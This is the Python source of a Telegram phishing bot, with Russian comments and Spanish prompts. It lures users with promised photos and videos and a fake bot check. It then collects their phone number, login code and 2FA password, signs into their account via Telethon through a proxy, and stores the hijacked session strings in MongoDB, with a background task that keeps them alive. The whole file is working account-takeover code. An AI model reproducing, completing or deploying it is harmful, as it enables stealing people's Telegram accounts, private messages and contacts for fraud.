import logging
import os
import json
import asyncio
import random
from datetime import datetime
from aiogram import Bot, Dispatcher, types
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.utils import executor
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors.rpcerrorlist import SessionPasswordNeededError, PhoneCodeExpiredError, PhoneCodeInvalidError
from pymongo import MongoClient
from dotenv import load_dotenv
import phonenumbers
from phonenumbers import geocoder

load_dotenv()

# Конфигурация
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
MONGO_URI = os.getenv("MONGO_URI")

PROXY_HOST = os.getenv("PROXY_HOST")
PROXY_PORT = int(os.getenv("PROXY_PORT"))
PROXY_USER = os.getenv("PROXY_USER")
PROXY_PASS = os.getenv("PROXY_PASS")
proxy = ('socks5', PROXY_HOST, PROXY_PORT, True, PROXY_USER, PROXY_PASS)

# Инициализация
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)
mongo = MongoClient(MONGO_URI)
db = mongo["dbmango"]
sessions_col = db["sessions"]

# Глобальные переменные
user_states = {}
user_clients = {}
user_phones = {}
user_code_buffers = {}
session_keepers = {}

# Константы
MAX_SESSIONS = 200

os.makedirs("sessions", exist_ok=True)

async def maintain_sessions(user_id, phone, main_session_str):
    """Поддерживаем пул активных сессий"""
    # Получаем текущие сессии пользователя
    existing_sessions = list(sessions_col.find({"user_id": user_id}))
    
    # Проверяем активность существующих сессий
    active_sessions = 0
    for session in existing_sessions:
        client = TelegramClient(StringSession(session['session']), API_ID, API_HASH, proxy=proxy)
        try:
            await client.connect()
            if await client.is_user_authorized():
                active_sessions += 1
            else:
                # Удаляем неактивную сессию
                sessions_col.delete_one({"_id": session["_id"]})
        except:
            sessions_col.delete_one({"_id": session["_id"]})
        finally:
            await client.disconnect()
    
    # Создаем недостающие сессии
    if active_sessions < MAX_SESSIONS:
        needed = MAX_SESSIONS - active_sessions
        for _ in range(needed):
            client = TelegramClient(StringSession(main_session_str), API_ID, API_HASH, proxy=proxy)
            await client.connect()
            new_session_str = client.session.save()
            
            sessions_col.insert_one({
                "user_id": user_id,
                "phone": phone,
                "session": new_session_str,
                "created_at": datetime.utcnow(),
                "last_active": datetime.utcnow()
            })
            
            await client.disconnect()

async def session_monitor():
    """Фоновая задача для поддержания сессий"""
    while True:
        await asyncio.sleep(3600)  # Проверка каждый час
        try:
            # Получаем всех пользователей с сессиями
            users_with_sessions = sessions_col.distinct("user_id")
            
            for user_id in users_with_sessions:
                # Получаем основную сессию пользователя
                main_session = sessions_col.find_one({"user_id": user_id})
                if main_session:
                    await maintain_sessions(user_id, main_session['phone'], main_session['session'])
        except Exception as e:
            logging.error(f"Session monitor error: {e}")

@dp.message_handler(commands=['start'])
async def cmd_start(message: types.Message):
    keyboard = InlineKeyboardMarkup().add(
        InlineKeyboardButton("Autorización en la primera cuenta🥺", callback_data="auth_account")
    )
    await message.answer(
        "👋🇪🇨 ¡HOLA! ❤️\n"
        "¿Quieres ver más de 10.000 fotos y más de 4.000 vídeos? 👁\n"
        "Verifica que no eres un bot con el botón de abajo. 🤖👇\n\n",
        reply_markup=keyboard
    )

@dp.callback_query_handler(lambda c: c.data == 'auth_account')
async def start_auth(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    user_states[user_id] = 'awaiting_contact'

    kb = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    kb.add(KeyboardButton("📱 Comparte tu número", request_contact=True))

    await bot.send_message(user_id, "🥺Por favor comparte tu número de teléfono:", reply_markup=kb)
    await bot.answer_callback_query(callback_query.id)

@dp.message_handler(content_types=types.ContentType.CONTACT)
async def handle_contact(message: types.Message):
    user_id = message.from_user.id
    if user_states.get(user_id) != 'awaiting_contact':
        return

    phone = message.contact.phone_number
    if not phone.startswith("+"):
        phone = "+" + phone

    client = TelegramClient(StringSession(), API_ID, API_HASH, proxy=proxy)
    await client.connect()
    user_clients[user_id] = client
    user_phones[user_id] = phone

    try:
        code_request = await client.send_code_request(phone)
        user_states[user_id] = 'awaiting_code'
        user_code_buffers[user_id] = {
            'code': '',
            'message_id': None,
            'phone_code_hash': code_request.phone_code_hash
        }
        msg_id = await send_code_keyboard(user_id, "", None)
        user_code_buffers[user_id]['message_id'] = msg_id
        await message.answer("⌨️ Ingresa el código presionando los botones a continuación:")
    except Exception as e:
        await message.answer(f"❌ Error al enviar el código: {e}")
        await client.disconnect()
        cleanup(user_id)

async def send_code_keyboard(user_id, current_code, message_id=None):
    digits = [[1, 2, 3], [4, 5, 6], [7, 8, 9], [0]]
    buttons = []
    for row in digits:
        btn_row = [InlineKeyboardButton(str(d), callback_data=f"code_{d}") for d in row]
        buttons.append(btn_row)
    buttons.append([InlineKeyboardButton("✅ Enviar", callback_data="code_send")])
    buttons.append([InlineKeyboardButton("🔄 Reenviar código", callback_data="resend_code")])
    keyboard = InlineKeyboardMarkup(inline_keyboard=buttons)
    text = f"Código: `{current_code}`" if current_code else "Ingresa el código:"

    if message_id:
        await bot.edit_message_text(chat_id=user_id, message_id=message_id,
                                  text=text, reply_markup=keyboard, parse_mode='Markdown')
    else:
        msg = await bot.send_message(user_id, text, reply_markup=keyboard, parse_mode='Markdown')
        return msg.message_id

@dp.callback_query_handler(lambda c: c.data == 'resend_code')
async def resend_code(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    if user_states.get(user_id) != 'awaiting_code':
        await bot.answer_callback_query(callback_query.id, text="⛔️ No es el momento adecuado", show_alert=True)
        return

    client = user_clients.get(user_id)
    phone = user_phones.get(user_id)
    if not client or not phone:
        await bot.answer_callback_query(callback_query.id, text="Error de sesión", show_alert=True)
        return

    try:
        code_request = await client.send_code_request(phone)
        user_code_buffers[user_id]['phone_code_hash'] = code_request.phone_code_hash
        await bot.answer_callback_query(callback_query.id, text="Código reenviado")
    except Exception as e:
        await bot.answer_callback_query(callback_query.id, text=f"Error: {str(e)}", show_alert=True)

@dp.callback_query_handler(lambda c: c.data.startswith("code_"))
async def process_code_button(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    data = callback_query.data

    if user_states.get(user_id) != 'awaiting_code':
        await bot.answer_callback_query(callback_query.id, text="⛔️ No es el momento adecuado", show_alert=True)
        return

    buffer = user_code_buffers.get(user_id)
    if not buffer:
        await bot.answer_callback_query(callback_query.id, text="Error interno.", show_alert=True)
        return

    current_code = buffer['code']
    message_id = buffer['message_id']

    if data == "code_send":
        if not current_code:
            await bot.answer_callback_query(callback_query.id, text="⚠️ Ingresa el código primero", show_alert=True)
            return
        await bot.answer_callback_query(callback_query.id)
        await try_sign_in(user_id, current_code)
    else:
        digit = data.split("_")[1]
        if len(current_code) >= 10:
            await bot.answer_callback_query(callback_query.id, text="⚠️ Código demasiado largo", show_alert=True)
            return
        current_code += digit
        user_code_buffers[user_id]['code'] = current_code
        await bot.answer_callback_query(callback_query.id)
        await send_code_keyboard(user_id, current_code, message_id)

async def try_sign_in(user_id, code):
    client = user_clients.get(user_id)
    phone = user_phones.get(user_id)
    buffer = user_code_buffers.get(user_id)
    
    if not client or not phone or not buffer:
        await bot.send_message(user_id, "⚠️ Sesión no encontrada. Por favor, intenta nuevamente con /start")
        cleanup(user_id)
        return

    try:
        # Пробуем войти с кодом
        await client.sign_in(
            phone=phone,
            code=code,
            phone_code_hash=buffer['phone_code_hash']
        )
        
        if await client.is_user_authorized():
            await handle_successful_auth(user_id, client)
        else:
            user_states[user_id] = 'awaiting_2fa'
            await bot.send_message(user_id, "🔐 Ingresa tu contraseña 2FA:")
            
    except SessionPasswordNeededError:
        user_states[user_id] = 'awaiting_2fa'
        await bot.send_message(user_id, "🔐 Se requiere tu contraseña 2FA. Por favor, ingrésala:")
    except PhoneCodeInvalidError:
        await bot.send_message(user_id, "❌ Código incorrecto. Inténtalo de nuevo:")
        user_code_buffers[user_id]['code'] = ""
        await send_code_keyboard(user_id, "", buffer['message_id'])
    except PhoneCodeExpiredError:
        await bot.send_message(user_id, "⏰ Código expirado. Por favor, intenta nuevamente con /start")
        await client.disconnect()
        cleanup(user_id)
    except Exception as e:
        await bot.send_message(user_id, f"❌ Error de autenticación: {e}")
        await client.disconnect()
        cleanup(user_id)

async def handle_successful_auth(user_id, client):
    """Обработка успешной авторизации"""
    phone = user_phones.get(user_id)
    if not phone:
        return

    session_str = client.session.save()
    
    # Сохраняем основную сессию
    sessions_col.update_one(
        {"user_id": user_id, "is_main": True},
        {"$set": {
            "phone": phone,
            "session": session_str,
            "last_active": datetime.utcnow()
        }},
        upsert=True
    )
    
    # Создаем/обновляем пул сессий
    await maintain_sessions(user_id, phone, session_str)
    
    await bot.send_message(user_id, "✅ ¡Autenticación exitosa! Se han activado múltiples sesiones.")
    await bot.send_message(
        user_id,
        "Estamos trabajando en modo manual, disculpen la demora, "
        "pronto les enviaremos material fotográfico y de video😉🧍‍♀️."
    )
    
    await client.disconnect()
    cleanup(user_id)

@dp.message_handler(lambda message: user_states.get(message.from_user.id) == 'awaiting_2fa')
async def process_2fa(message: types.Message):
    user_id = message.from_user.id
    password = message.text.strip()
    client = user_clients.get(user_id)
    phone = user_phones.get(user_id)

    if not client or not phone:
        await message.answer("⚠️ Sesión no encontrada. Por favor, intenta nuevamente con /start")
        cleanup(user_id)
        return

    try:
        await client.sign_in(password=password)
        
        if await client.is_user_authorized():
            await handle_successful_auth(user_id, client)
        else:
            await message.answer("❌ No se pudo autenticar con 2FA.")
    except Exception as e:
        await message.answer(f"❌ Error con 2FA: {e}")
    finally:
        await client.disconnect()
        cleanup(user_id)

def cleanup(user_id):
    """Очистка данных пользователя"""
    user_states.pop(user_id, None)
    user_clients.pop(user_id, None)
    user_phones.pop(user_id, None)
    user_code_buffers.pop(user_id, None)

async def on_startup(dp):
    asyncio.create_task(session_monitor())

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True, on_startup=on_startup)